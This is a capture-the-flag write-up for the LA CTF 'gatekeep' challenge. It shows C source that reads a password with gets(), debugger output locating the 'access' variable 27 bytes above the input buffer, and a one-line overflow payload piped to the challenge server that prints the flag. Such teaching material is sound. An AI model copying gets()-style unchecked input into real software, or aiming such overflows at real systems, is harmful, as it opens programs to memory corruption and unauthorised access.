---
title: "LA CTF - pwn: gatekeep"
date: 2023-02-13 00:00:00 +/-0500
categories: [Cybersecurity, CTFs]
tags: [CTF, LA CTF, cybersecurity, buffer overflow, Python, variable overwrite, check bypass]
---

## Description

If I gaslight you enough, you won't be able to get my flag! :)

nc lac.tf 31121

Note: The attached binary is the exact same as the one executing on the remote server.

## Source code

The source code, its binary, and the Dockerfile were given. Looking at the
sour code code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>

void print_flag() {
    char flag[256];

    FILE* flagfile = fopen("flag.txt", "r");
    
    if (flagfile == NULL) {
        puts("Cannot read flag.txt.");
    } else {
        fgets(flag, 256, flagfile);
        flag[strcspn(flag, "\n")] = '\0';
        puts(flag);
    }
}

int check(){
    char input[15];
    char pass[10];
    int access = 0;

    // If my password is random, I can gatekeep my flag! :)
    int data = open("/dev/urandom", O_RDONLY);
    if (data < 0)
    {
        printf("Can't access /dev/urandom.\n");
        exit(1);
    }
    else
    {
        ssize_t result = read(data, pass, sizeof pass);
        if (result < 0)
        {
            printf("Data not received from /dev/urandom\n");
            exit(1);
        }
    }
    close(data);
    
    printf("Password:\n");
    gets(input);

    if(strcmp(input, pass)) {
        printf("I swore that was the right password ...\n");
    }
    else {
        access = 1;
    }

    if(access) {
        printf("Guess I couldn't gaslight you!\n");
        print_flag();
    }
}

int main(){
    setbuf(stdout, NULL);
    printf("If I gaslight you enough, you won't be able to guess my password! :)\n");
    check();
    return 0;
}
```

within `check()`, the password is being stored into a buffer using `gets()`. So
I immediately thought that if I can control the return address of `check()`
function to `print_flag()`, then we can get the flag. I checked the security
properties of this binary by running `pwn checksec --file=./gatekeep`.

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
```

Although these security features are enabled, this challenge can be as easy as
overwriting `access` variable by overflowing the buffer. Although this challenge
seems to be an easy one, we want to know why this works. One can question that
how can a buffer that is declared before `access` variable can overwrite a
variable that is declared after the buffer? Because `input` is declared first
within the stack frame, it would be located at a higher address (the stack grows
from the higher address to the lower address) and `access` would be located at a
lower address. And when a buffer is filled, it would start from the lower
address (so the beginning of the buffer) and it grows to the higher address. So
it seems like it is impossible to overwrite `access` variable. But what we need
to consider is how the compiler puts things onto the stack. Due to all the
techniques and reasons, the compiler ends up placing `access` before `input`
buffer. If we take a look at this program in GDB, we can check the addresses of
these variables.

```
   0x5555555552f9 <check+165>    mov    rsi, rdx
   0x5555555552fc <check+168>    mov    rdi, rax
 ► 0x5555555552ff <check+171>    call   strcmp@plt                <strcmp@plt>
        s1: 0x7fffffffdcf1 ◂— 0x2000000061616161 /* 'aaaa' */
        s2: 0x7fffffffdce7 ◂— 0x2aa7c1bf24aa3127
```

This is the comparison between `pass` and `input` variable. `input` gets moved
into `rdi` register as it is the first argument to `strcmp` function (and you
can see the input `aaaa`). The address that `aaaa` is stored is at
`0x7fffffffdcf1`. This is the address of `input` buffer. 

Now, we will see where `access` is located at:

```
0x55555555531d <check+201>    cmp    dword ptr [rbp - 4], 0
0x555555555321 <check+205>    je     check+229                <check+229>
```

This is the comparison (or if statement) where it is checking whether `access`
is 0 or some value:

```
if(access) {
      printf("Guess I couldn't gaslight you!\n");
      // more code...
```

We can see that the value of `access` is at `rbp - 4`. Let's print the address
of `rbp - 4`: 

```
pwndbg> p $rbp - 4
$1 = (void *) 0x7fffffffdd0c
```

If we compare the two addresses (`access` and `input`), we can see which one is
declared first. If we do `0x7fffffffdd0c - 0x7fffffffdcf1`, we get:


```
pwndbg> p 0x7fffffffdd0c - 0x7fffffffdcf1
$2 = 27
```

This tells us that 0x7fffffffdd0c which is the address to the value of `access`
is located at a higher memory address (meaning it was put onto the stack first). 
So now we can simply overflow the buffer to affect the value of this `access`
variable. Since the distance between the two variables are 27 bytes, I passed in
28 bytes of input to the program:

```
└─$ python -c 'print("A"*28)' | nc lac.tf 31121
If I gaslight you enough, you won't be able to guess my password! :)
Password:
I swore that was the right password ...
Guess I couldn't gaslight you!
lactf{sCr3am1nG_cRy1Ng_tHr0w1ng_uP}
```

One might of gotten the flag by just trying to overflow the buffer but I think
it is always good to know why something works in such a way. Thanks for reading!
